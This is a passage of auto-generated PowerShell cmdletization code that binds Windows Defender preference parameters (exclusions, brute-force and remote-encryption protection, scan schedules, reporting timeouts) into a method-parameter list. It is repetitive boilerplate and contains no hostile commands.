$false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\r\n          [object]$__cmdletization_value = ${ExclusionPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaul"
"tValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\r\n          [object]$__cmdletization_value = ${ExclusionExtension}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\r\n          [object]$__cmdletization_value = ${ExclusionProcess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\r\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\r\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleTime')) {\r\n          [object]$__cmdletization_value = ${RemediationScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredSta"
"te'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {\r\n          [object]$__cmdletization_value = ${ServiceHealthReportInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {\r\n          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\r\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\r\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\r\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\r\n          $__cmdletization_methodParam"
"eter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\r\n          [object]$__cmdletization_value = ${ScanParameters}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\r\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        